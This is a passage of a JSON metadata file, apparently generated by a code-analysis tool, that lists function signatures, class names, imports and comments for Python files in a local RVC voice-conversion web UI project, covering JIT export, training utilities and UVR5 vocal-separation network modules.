          "def benchmark(",
          "def jit_warm_up(model, inputs_path, device=torch.device(\"cpu\"), epoch=5, is_half=False):",
          "def to_jit_model(",
          "def export(",
          "def load(path: str):",
          "def save(ckpt: dict, save_path: str):",
          "def rmvpe_jit_export(",
          "def synthesizer_jit_export("
        ],
        "class_defs": [],
        "imports": [
          "from io import BytesIO",
          "import pickle",
          "import time",
          "import torch",
          "from tqdm import tqdm",
          "from collections import OrderedDict",
          "from .get_synthesizer import get_synthesizer",
          "from .get_rmvpe import get_rmvpe",
          "from .get_hubert import get_hubert_model",
          "from .get_rmvpe import get_rmvpe",
          "from .get_synthesizer import get_synthesizer"
        ],
        "comments": [
          "# model = model.half() if is_half else model.float()",
          "# model_jit=model_jit.cpu()"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/jit/get_synthesizer.py",
        "docstrings": [],
        "function_defs": [
          "def get_synthesizer(pth_path, device=torch.device(\"cpu\")):"
        ],
        "class_defs": [],
        "imports": [
          "import torch",
          "from infer.lib.infer_pack.models import ("
        ],
        "comments": [
          "# tgt_sr = cpt[\"config\"][-1]",
          "# net_g.forward = net_g.infer",
          "# ckpt = {}",
          "# ckpt[\"config\"] = cpt[\"config\"]",
          "# ckpt[\"f0\"] = if_f0",
          "# ckpt[\"version\"] = version",
          "# ckpt[\"info\"] = cpt.get(\"info\", \"0epoch\")"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/jit/get_rmvpe.py",
        "docstrings": [],
        "function_defs": [
          "def get_rmvpe(model_path=\"assets/rmvpe/rmvpe.pt\", device=torch.device(\"cpu\")):"
        ],
        "class_defs": [],
        "imports": [
          "import torch",
          "from infer.lib.rmvpe import E2E"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/uvr5_pack/utils.py",
        "docstrings": [],
        "function_defs": [
          "def load_data(file_name: str = \"./infer/lib/uvr5_pack/name_params.json\") -> dict:",
          "def make_padding(width, cropsize, offset):",
          "def inference(X_spec, device, model, aggressiveness, data):\n\"\"\"\ndata \uff1a dic configs\n\"\"\"",
          "def _execute(",
          "def preprocess(X_spec):",
          "def _get_name_params(model_path, model_hash):"
        ],
        "class_defs": [],
        "imports": [
          "import json",
          "import numpy as np",
          "import torch",
          "from tqdm import tqdm"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/train/mel_processing.py",
        "docstrings": [],
        "function_defs": [
          "def dynamic_range_compression_torch(x, C=1, clip_val=1e-5):\n\"\"\"\nPARAMS\n------\nC: compression factor\n\"\"\"",
          "def dynamic_range_decompression_torch(x, C=1):\n\"\"\"\nPARAMS\n------\nC: compression factor used to compress\n\"\"\"",
          "def spectral_normalize_torch(magnitudes):",
          "def spectral_de_normalize_torch(magnitudes):",
          "def spectrogram_torch(y, n_fft, sampling_rate, hop_size, win_size, center=False):\n\"\"\"Convert waveform into Linear-frequency Linear-amplitude spectrogram.\n\nArgs:\ny             :: (B, T) - Audio waveforms\nn_fft\nsampling_rate\nhop_size\nwin_size\ncenter",
          "def spec_to_mel_torch(spec, n_fft, num_mels, sampling_rate, fmin, fmax):",
          "def mel_spectrogram_torch("
        ],
        "class_defs": [],
        "imports": [
          "import torch",
          "import torch.utils.data",
          "from librosa.filters import mel as librosa_mel_fn",
          "import logging"
        ],
        "comments": [
          "# Reusable banks",
          "# Window - Cache if needed",
          "# Padding",
          "# Complex Spectrogram :: (B, T) -> (B, Freq, Frame, RealComplex=2)",
          "# Linear-frequency Linear-amplitude spectrogram :: (B, Freq, Frame, RealComplex=2) -> (B, Freq, Frame)",
          "# MelBasis - Cache if needed",
          "# Mel-frequency Log-amplitude spectrogram :: (B, Freq=num_mels, Frame)",
          "# Linear-frequency Linear-amplitude spectrogram :: (B, T) -> (B, Freq, Frame)",
          "# Mel-frequency Log-amplitude spectrogram :: (B, Freq, Frame) -> (B, Freq=num_mels, Frame)"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/train/process_ckpt.py",
        "docstrings": [],
        "function_defs": [
          "def savee(ckpt, sr, if_f0, name, epoch, version, hps):",
          "def show_info(path):",
          "def extract_small_model(path, name, sr, if_f0, info, version):",
          "def change_info(path, info, name):",
          "def merge(path1, path2, alpha1, sr, f0, info, name, version):",
          "def extract(ckpt):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import traceback",
          "from collections import OrderedDict",
          "import torch",
          "from i18n.i18n import I18nAuto"
        ],
        "comments": [
          "# try:",
          "# except:",
          "#     pdb.set_trace()"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 5,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/train/data_utils.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, audiopaths_and_text, hparams):",
          "def _filter(self):\n\"\"\"\nFilter text & store spec lengths\n\"\"\"",
          "def get_sid(self, sid):",
          "def get_audio_text_pair(self, audiopath_and_text):",
          "def get_labels(self, phone, pitch, pitchf):",
          "def get_audio(self, filename):",
          "def __getitem__(self, index):",
          "def __len__(self):",
          "def __init__(self, return_ids=False):",
          "def __call__(self, batch):\n\"\"\"Collate's training batch from normalized text and aduio\nPARAMS\n------\nbatch: [text_normalized, spec_normalized, wav_normalized]\n\"\"\"",
          "def __init__(self, audiopaths_and_text, hparams):",
          "def _filter(self):\n\"\"\"\nFilter text & store spec lengths\n\"\"\"",
          "def get_sid(self, sid):",
          "def get_audio_text_pair(self, audiopath_and_text):",
          "def get_labels(self, phone):",
          "def get_audio(self, filename):",
          "def __getitem__(self, index):",
          "def __len__(self):",
          "def __init__(self, return_ids=False):",
          "def __call__(self, batch):\n\"\"\"Collate's training batch from normalized text and aduio\nPARAMS\n------\nbatch: [text_normalized, spec_normalized, wav_normalized]\n\"\"\"",
          "def __init__(",
          "def _create_buckets(self):",
          "def __iter__(self):",
          "def _bisect(self, x, lo=0, hi=None):",
          "def __len__(self):"
        ],
        "class_defs": [
          "class TextAudioLoaderMultiNSFsid(torch.utils.data.Dataset):",
          "class TextAudioCollateMultiNSFsid:",
          "class TextAudioLoader(torch.utils.data.Dataset):",
          "class TextAudioCollate:",
          "class DistributedBucketSampler(torch.utils.data.distributed.DistributedSampler):"
        ],
        "imports": [
          "import os",
          "import traceback",
          "import logging",
          "import numpy as np",
          "import torch",
          "import torch.utils.data",
          "from infer.lib.train.mel_processing import spectrogram_torch",
          "from infer.lib.train.utils import load_filepaths_and_text, load_wav_to_torch"
        ],
        "comments": [
          "# Store spectrogram lengths for Bucketing",
          "# wav_length ~= file_size / (wav_channels * Bytes per dim) = file_size / (1 * 2)",
          "# spec_length = wav_length // hop_length",
          "# separate filename and text",
          "# print(123,phone.shape,pitch.shape,spec.shape)",
          "# amor",
          "# print(234,phone.shape,pitch.shape)",
          "#        audio_norm = audio / self.max_wav_value",
          "#        audio_norm = audio / np.abs(audio).max()",
          "# Right zero-pad all one-hot text sequences to max input length",
          "# dv = torch.FloatTensor(len(batch), 256)#gin=256",
          "# dv[i] = row[5]",
          "# dv",
          "# Store spectrogram lengths for Bucketing",
          "# wav_length ~= file_size / (wav_channels * Bytes per dim) = file_size / (1 * 2)",
          "# spec_length = wav_length // hop_length",
          "# separate filename and text",
          "#        audio_norm = audio / self.max_wav_value",
          "#        audio_norm = audio / np.abs(audio).max()",
          "# Right zero-pad all one-hot text sequences to max input length",
          "# deterministically shuffle based on epoch",
          "# add extra samples to make it evenly divisible",
          "# subsample",
          "# batching"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 10,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/train/utils.py",
        "docstrings": [],
        "function_defs": [
          "def load_checkpoint_d(checkpoint_path, combd, sbd, optimizer=None, load_opt=1):",
          "def go(model, bkey):",
          "def load_checkpoint(checkpoint_path, model, optimizer=None, load_opt=1):",
          "def save_checkpoint(model, optimizer, learning_rate, iteration, checkpoint_path):",
          "def save_checkpoint_d(combd, sbd, optimizer, learning_rate, iteration, checkpoint_path):",
          "def summarize(",
          "def latest_checkpoint_path(dir_path, regex=\"G_*.pth\"):",
          "def plot_spectrogram_to_numpy(spectrogram):",
          "def plot_alignment_to_numpy(alignment, info=None):",
          "def load_wav_to_torch(full_path):",
          "def load_filepaths_and_text(filename, split=\"|\"):",
          "def get_hparams(init=True):\n\"\"\"\ntodo:\n\u7ed3\u5c3e\u4e03\u4eba\u7ec4\uff1a\n\u4fdd\u5b58\u9891\u7387\u3001\u603bepoch                     done\nbs                                    done\npretrainG\u3001pretrainD                  done\n\u5361\u53f7\uff1aos.en[\"CUDA_VISIBLE_DEVICES\"]   done\nif_latest                             done\n\u6a21\u578b\uff1aif_f0                             done",
          "def get_hparams_from_dir(model_dir):",
          "def get_hparams_from_file(config_path):",
          "def check_git_hash(model_dir):",
          "def get_logger(model_dir, filename=\"train.log\"):",
          "def __init__(self, **kwargs):",
          "def keys(self):",
          "def items(self):",
          "def values(self):",
          "def __len__(self):",
          "def __getitem__(self, key):",
          "def __setitem__(self, key, value):",
          "def __contains__(self, key):",
          "def __repr__(self):"
        ],
        "class_defs": [
          "class HParams:"
        ],
        "imports": [
          "import argparse",
          "import glob",
          "import json",
          "import logging",
          "import os",
          "import subprocess",
          "import sys",
          "import shutil",
          "import numpy as np",
          "import torch",
          "from scipy.io.wavfile import read",
          "import matplotlib",
          "import matplotlib.pylab as plt",
          "import numpy as np",
          "import matplotlib",
          "import matplotlib.pylab as plt",
          "import numpy as np"
        ],
        "comments": [
          "##################",
          "# logger.info(traceback.format_exc())",
          "#############",
          "#   try:",
          "#   except:",
          "#     traceback.print_exc()",
          "# def load_checkpoint(checkpoint_path, model, optimizer=None):",
          "#   assert os.path.isfile(checkpoint_path)",
          "#   checkpoint_dict = torch.load(checkpoint_path, map_location='cpu')",
          "#   iteration = checkpoint_dict['iteration']",
          "#   learning_rate = checkpoint_dict['learning_rate']",
          "#   if optimizer is not None:",
          "#     optimizer.load_state_dict(checkpoint_dict['optimizer'])",
          "#   # print(1111)",
          "#   saved_state_dict = checkpoint_dict['model']",
          "#   # print(1111)",
          "#",
          "#   if hasattr(model, 'module'):",
          "#     state_dict = model.module.state_dict()",
          "#   else:",
          "#     state_dict = model.state_dict()",
          "#   new_state_dict= {}",
          "#   for k, v in state_dict.items():",
          "#     try:",
          "#       new_state_dict[k] = saved_state_dict[k]",
          "#     except:",
          "#       logger.info(\"%s is not in the checkpoint\" % k)",
          "#       new_state_dict[k] = v",
          "#   if hasattr(model, 'module'):",
          "#     model.module.load_state_dict(new_state_dict)",
          "#   else:",
          "#     model.load_state_dict(new_state_dict)",
          "#   logger.info(\"Loaded checkpoint '{}' (epoch {})\" .format(",
          "#     checkpoint_path, iteration))",
          "#   return model, optimizer, learning_rate, iteration",
          "# logger.info(traceback.format_exc())",
          "#   try:",
          "#   except:",
          "#     traceback.print_exc()"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 2,
        "error_handling": 6,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/train/losses.py",
        "docstrings": [],
        "function_defs": [
          "def feature_loss(fmap_r, fmap_g):",
          "def discriminator_loss(disc_real_outputs, disc_generated_outputs):",
          "def generator_loss(disc_outputs):",
          "def kl_loss(z_p, logs_q, m_p, logs_p, z_mask):\n\"\"\"\nz_p, logs_q: [b, h, t_t]\nm_p, logs_p: [b, h, t_t]\n\"\"\""
        ],
        "class_defs": [],
        "imports": [
          "import torch"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/uvr5_pack/lib_v5/layers_123821KB.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, dilation=1, activ=nn.ReLU):",
          "def __call__(self, x):",
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, dilation=1, activ=nn.ReLU):",
          "def __call__(self, x):",
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, activ=nn.LeakyReLU):",
          "def __call__(self, x):",
          "def __init__(",
          "def __call__(self, x, skip=None):",
          "def __init__(self, nin, nout, dilations=(4, 8, 16), activ=nn.ReLU):",
          "def forward(self, x):"
        ],
        "class_defs": [
          "class Conv2DBNActiv(nn.Module):",
          "class SeperableConv2DBNActiv(nn.Module):",
          "class Encoder(nn.Module):",
          "class Decoder(nn.Module):",
          "class ASPPModule(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn.functional as F",
          "from torch import nn",
          "from . import spec_utils"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/uvr5_pack/lib_v5/nets_new.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def __call__(self, x):",
          "def __init__(self, n_fft, nout=32, nout_lstm=128):",
          "def forward(self, x):",
          "def predict_mask(self, x):",
          "def predict(self, x, aggressiveness=None):"
        ],
        "class_defs": [
          "class BaseNet(nn.Module):",
          "class CascadedNet(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn.functional as F",
          "from torch import nn",
          "from . import layers_new"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/uvr5_pack/lib_v5/nets_123812KB.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, nin, ch, dilations=(4, 8, 16)):",
          "def __call__(self, x):",
          "def __init__(self, n_fft):",
          "def forward(self, x, aggressiveness=None):",
          "def predict(self, x_mag, aggressiveness=None):"
        ],
        "class_defs": [
          "class BaseASPPNet(nn.Module):",
          "class CascadedASPPNet(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn.functional as F",
          "from torch import nn",
          "from . import layers_123821KB as layers"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/uvr5_pack/lib_v5/nets_537238KB.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, nin, ch, dilations=(4, 8, 16)):",
          "def __call__(self, x):",
          "def __init__(self, n_fft):",
          "def forward(self, x, aggressiveness=None):",
          "def predict(self, x_mag, aggressiveness=None):"
        ],
        "class_defs": [
          "class BaseASPPNet(nn.Module):",
          "class CascadedASPPNet(nn.Module):"
        ],
        "imports": [
          "import numpy as np",
          "import torch",
          "import torch.nn.functional as F",
          "from torch import nn",
          "from . import layers_537238KB as layers"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/uvr5_pack/lib_v5/layers_537227KB.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, dilation=1, activ=nn.ReLU):",
          "def __call__(self, x):",
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, dilation=1, activ=nn.ReLU):",
          "def __call__(self, x):",
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, activ=nn.LeakyReLU):",
          "def __call__(self, x):",
          "def __init__(",
          "def __call__(self, x, skip=None):",
          "def __init__(self, nin, nout, dilations=(4, 8, 16, 32, 64), activ=nn.ReLU):",
          "def forward(self, x):"
        ],
        "class_defs": [
          "class Conv2DBNActiv(nn.Module):",
          "class SeperableConv2DBNActiv(nn.Module):",
          "class Encoder(nn.Module):",
          "class Decoder(nn.Module):",
          "class ASPPModule(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn.functional as F",
          "from torch import nn",
          "from . import spec_utils"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/uvr5_pack/lib_v5/layers_123812KB .py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, dilation=1, activ=nn.ReLU):",
          "def __call__(self, x):",
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, dilation=1, activ=nn.ReLU):",
          "def __call__(self, x):",
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, activ=nn.LeakyReLU):",
          "def __call__(self, x):",
          "def __init__(",
          "def __call__(self, x, skip=None):",
          "def __init__(self, nin, nout, dilations=(4, 8, 16), activ=nn.ReLU):",
          "def forward(self, x):"
        ],
        "class_defs": [
          "class Conv2DBNActiv(nn.Module):",
          "class SeperableConv2DBNActiv(nn.Module):",
          "class Encoder(nn.Module):",
          "class Decoder(nn.Module):",
          "class ASPPModule(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn.functional as F",
          "from torch import nn",
          "from . import spec_utils"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/uvr5_pack/lib_v5/spec_utils.py",
        "docstrings": [],
        "function_defs": [
          "def crop_center(h1, h2):",
          "def wave_to_spectrogram(",
          "def wave_to_spectrogram_mt(",
          "def run_thread(**kwargs):",
          "def combine_spectrograms(specs, mp):",
          "def spectrogram_to_image(spec, mode=\"magnitude\"):",
          "def reduce_vocal_aggressively(X, y, softmask):",
          "def mask_silence(mag, ref, thres=0.2, min_range=64, fade_size=32):",
          "def align_wave_head_and_tail(a, b):",
          "def cache_or_load(mix_path, inst_path, mp):",
          "def spectrogram_to_wave(spec, hop_length, mid_side, mid_side_b2, reverse):",
          "def spectrogram_to_wave_mt(spec, hop_length, mid_side, reverse, mid_side_b2):",
          "def run_thread(**kwargs):",
          "def cmb_spectrogram_to_wave(spec_m, mp, extra_bins_h=None, extra_bins=None):",
          "def fft_lp_filter(spec, bin_start, bin_stop):",
          "def fft_hp_filter(spec, bin_start, bin_stop):",
          "def mirroring(a, spec_m, input_high_end, mp):",
          "def ensembling(a, specs):",
          "def stft(wave, nfft, hl):",
          "def istft(spec, hl):"
        ],
        "class_defs": [],
        "imports": [
          "import hashlib",
          "import json",
          "import math",
          "import os",
          "import librosa",
          "import numpy as np",
          "import soundfile as sf",
          "from tqdm import tqdm",
          "import threading",
          "import threading",
          "import argparse",
          "import sys",
          "import time",
          "import cv2",
          "from model_param_init import ModelParameters"
        ],
        "comments": [
          "# s_freq = (h2_shape[2] - h1_shape[2]) // 2",
          "# e_freq = s_freq + h1_shape[2]",
          "# lowpass fiter",
          "# wave = librosa.core.resample(wave2, bp['sr'], sr, res_type=\"sinc_fastest\")",
          "# print('Total time: {0:.{1}f}s'.format(time.time() - start_time, 1))"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 6,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/uvr5_pack/lib_v5/nets_123821KB.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, nin, ch, dilations=(4, 8, 16)):",
          "def __call__(self, x):",
          "def __init__(self, n_fft):",
          "def forward(self, x, aggressiveness=None):",
          "def predict(self, x_mag, aggressiveness=None):"
        ],
        "class_defs": [
          "class BaseASPPNet(nn.Module):",
          "class CascadedASPPNet(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn.functional as F",
          "from torch import nn",
          "from . import layers_123821KB as layers"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/uvr5_pack/lib_v5/dataset.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, patch_list):",
          "def __len__(self):",
          "def __getitem__(self, idx):",
          "def make_pair(mix_dir, inst_dir):",
          "def train_val_split(dataset_dir, split_mode, val_rate, val_filelist):",
          "def augment(X, y, reduction_rate, reduction_mask, mixup_rate, mixup_alpha):",
          "def make_padding(width, cropsize, offset):",
          "def make_training_set(filelist, cropsize, patches, sr, hop_length, n_fft, offset):",
          "def make_validation_set(filelist, cropsize, sr, hop_length, n_fft, offset):"
        ],
        "class_defs": [
          "class VocalRemoverValidationSet(torch.utils.data.Dataset):"
        ],
        "imports": [
          "import os",
          "import random",
          "import numpy as np",
          "import torch",
          "import torch.utils.data",
          "from tqdm import tqdm",
          "from . import spec_utils"
        ],
        "comments": [
          "# swap channel",
          "# mono",
          "# inst"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/uvr5_pack/lib_v5/layers_33966KB.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, dilation=1, activ=nn.ReLU):",
          "def __call__(self, x):",
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, dilation=1, activ=nn.ReLU):",
          "def __call__(self, x):",
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, activ=nn.LeakyReLU):",
          "def __call__(self, x):",
          "def __init__(",
          "def __call__(self, x, skip=None):",
          "def __init__(self, nin, nout, dilations=(4, 8, 16, 32, 64), activ=nn.ReLU):",
          "def forward(self, x):"
        ],
        "class_defs": [
          "class Conv2DBNActiv(nn.Module):",
          "class SeperableConv2DBNActiv(nn.Module):",
          "class Encoder(nn.Module):",
          "class Decoder(nn.Module):",
          "class ASPPModule(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn.functional as F",
          "from torch import nn",
          "from . import spec_utils"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/uvr5_pack/lib_v5/nets_33966KB.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, nin, ch, dilations=(4, 8, 16, 32)):",
          "def __call__(self, x):",
          "def __init__(self, n_fft):",
          "def forward(self, x, aggressiveness=None):",
          "def predict(self, x_mag, aggressiveness=None):"
        ],
        "class_defs": [
          "class BaseASPPNet(nn.Module):",
          "class CascadedASPPNet(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn.functional as F",
          "from torch import nn",
          "from . import layers_33966KB as layers"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/uvr5_pack/lib_v5/layers_new.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, dilation=1, activ=nn.ReLU):",
          "def __call__(self, x):",
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, activ=nn.LeakyReLU):",
          "def __call__(self, x):",
          "def __init__(",
          "def __call__(self, x, skip=None):",
          "def __init__(self, nin, nout, dilations=(4, 8, 12), activ=nn.ReLU, dropout=False):",
          "def forward(self, x):",
          "def __init__(self, nin_conv, nin_lstm, nout_lstm):",
          "def forward(self, x):"
        ],
        "class_defs": [
          "class Conv2DBNActiv(nn.Module):",
          "class Encoder(nn.Module):",
          "class Decoder(nn.Module):",
          "class ASPPModule(nn.Module):",
          "class LSTMModule(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn.functional as F",
          "from torch import nn",
          "from . import spec_utils"
        ],
        "comments": [
          "# self.conv2 = Conv2DBNActiv(nout, nout, ksize, 1, pad, activ=activ)",
          "# h = self.conv2(h)"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/uvr5_pack/lib_v5/nets_61968KB.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, nin, ch, dilations=(4, 8, 16)):",
          "def __call__(self, x):",
          "def __init__(self, n_fft):",
          "def forward(self, x, aggressiveness=None):",
          "def predict(self, x_mag, aggressiveness=None):"
        ],
        "class_defs": [
          "class BaseASPPNet(nn.Module):",
          "class CascadedASPPNet(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn.functional as F",
          "from torch import nn",
          "from . import layers_123821KB as layers"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/uvr5_pack/lib_v5/layers_537238KB.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, dilation=1, activ=nn.ReLU):",
          "def __call__(self, x):",
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, dilation=1, activ=nn.ReLU):",
          "def __call__(self, x):",
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, activ=nn.LeakyReLU):",
          "def __call__(self, x):",
          "def __init__(",
          "def __call__(self, x, skip=None):",
          "def __init__(self, nin, nout, dilations=(4, 8, 16, 32, 64), activ=nn.ReLU):",
          "def forward(self, x):"
        ],
        "class_defs": [
          "class Conv2DBNActiv(nn.Module):",
          "class SeperableConv2DBNActiv(nn.Module):",
          "class Encoder(nn.Module):",
          "class Decoder(nn.Module):",
          "class ASPPModule(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn.functional as F",
          "from torch import nn",
          "from . import spec_utils"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/uvr5_pack/lib_v5/layers.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, dilation=1, activ=nn.ReLU):",
          "def __call__(self, x):",
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, dilation=1, activ=nn.ReLU):",
          "def __call__(self, x):",
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, activ=nn.LeakyReLU):",
          "def __call__(self, x):",
          "def __init__(",
          "def __call__(self, x, skip=None):",
          "def __init__(self, nin, nout, dilations=(4, 8, 16), activ=nn.ReLU):",
          "def forward(self, x):"
        ],
        "class_defs": [
          "class Conv2DBNActiv(nn.Module):",
          "class SeperableConv2DBNActiv(nn.Module):",
          "class Encoder(nn.Module):",
          "class Decoder(nn.Module):",
          "class ASPPModule(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn.functional as F",
          "from torch import nn",
          "from . import spec_utils"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/uvr5_pack/lib_v5/nets_537227KB.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, nin, ch, dilations=(4, 8, 16)):",
          "def __call__(self, x):",
          "def __init__(self, n_fft):",
          "def forward(self, x, aggressiveness=None):",
          "def predict(self, x_mag, aggressiveness=None):"
        ],
        "class_defs": [
          "class BaseASPPNet(nn.Module):",
          "class CascadedASPPNet(nn.Module):"
        ],
        "imports": [
          "import numpy as np",
          "import torch",
          "import torch.nn.functional as F",
          "from torch import nn",
          "from . import layers_537238KB as layers"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/uvr5_pack/lib_v5/model_param_init.py",
        "docstrings": [],
        "function_defs": [
          "def int_keys(d):",
          "def __init__(self, config_path=\"\"):"
        ],
        "class_defs": [
          "class ModelParameters(object):"
        ],
        "imports": [
          "import json",
          "import os",
          "import pathlib",
          "import zipfile"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/uvr5_pack/lib_v5/nets.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, nin, ch, dilations=(4, 8, 16)):",
          "def __call__(self, x):",
          "def __init__(self, n_fft):",
          "def forward(self, x, aggressiveness=None):",
          "def predict(self, x_mag, aggressiveness=None):"
        ],
        "class_defs": [
          "class BaseASPPNet(nn.Module):",
          "class CascadedASPPNet(nn.Module):"
        ],
        "imports": [
          "import layers",
          "import torch",
          "import torch.nn.functional as F",
